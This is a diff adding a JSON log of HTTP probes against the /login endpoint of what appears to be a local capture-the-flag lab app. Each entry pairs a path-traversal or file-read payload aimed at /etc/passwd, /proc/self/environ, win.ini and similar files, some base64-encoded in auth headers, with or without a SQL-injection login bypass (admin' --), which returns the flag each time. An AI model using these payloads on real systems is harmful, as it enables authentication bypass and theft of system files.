@@ -1,0 +1,452 @@
+[
+ {
+  "path": "/login",
+  "auth": null,
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.4572,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": null,
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.4069,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "/etc/passwd",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.4065,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "/etc/passwd",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.4069,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "../../../../etc/passwd",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.4063,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "../../../../etc/passwd",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.4066,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "../../../../../../etc/passwd",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.4064,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "../../../../../../etc/passwd",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.4068,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "....//....//....//etc/passwd",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.4059,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "....//....//....//etc/passwd",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.4063,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "/proc/self/environ",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0006,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "/proc/self/environ",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0008,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "/proc/self/cmdline",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0003,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "/proc/self/cmdline",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0005,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "/etc/hosts",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0004,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "/etc/hosts",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0003,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "C:\\Windows\\win.ini",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0005,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "C:\\Windows\\win.ini",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0003,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "..\\..\\..\\windows\\win.ini",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0003,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "..\\..\\..\\windows\\win.ini",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0003,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "file:///etc/passwd",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0003,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "file:///etc/passwd",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0004,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "file://localhost/etc/passwd",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0004,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "file://localhost/etc/passwd",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0004,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "php://filter/convert.base64-encode/resource=/etc/passwd",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0005,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "php://filter/convert.base64-encode/resource=/etc/passwd",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0004,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "/etc/passwd%00",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0005,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "/etc/passwd%00",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0005,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "/etc/passwd%00.png",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0003,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "/etc/passwd%00.png",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0002,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "..;/..;/etc/passwd",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0002,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "..;/..;/etc/passwd",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0005,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "/home/ubuntu/repos/melissacyber/lab/hard_app.py",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0002,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "/home/ubuntu/repos/melissacyber/lab/hard_app.py",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0003,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "../flag",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0004,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "../flag",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0004,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "flag.txt",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0004,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "flag.txt",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0004,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "users/admin",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0005,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "users/admin",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0003,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "Basic Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZDp4",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0002,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "Basic Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZDp4",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0002,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "Basic YWRtaW46Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0002,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "Basic YWRtaW46Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0002,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "Bearer /etc/passwd",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0003,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "Bearer /etc/passwd",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0004,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "Bearer ../../../../etc/passwd",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0003,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "Bearer ../../../../etc/passwd",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0003,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ },
+ {
+  "path": "/login",
+  "auth": "Token ../../../etc/passwd",
+  "status": 401,
+  "len": 19,
+  "md5_8": "3ab680f4",
+  "t": 0.0006,
+  "body_head": "invalid credentials"
+ },
+ {
+  "path": "/login?u=admin%27%20--",
+  "auth": "Token ../../../etc/passwd",
+  "status": 200,
+  "len": 50,
+  "md5_8": "a330c4eb",
+  "t": 0.0005,
+  "body_head": "Welcome admin! FLAG{h4rd_l4b_pwnd_by_melissacyber}"
+ }
+]
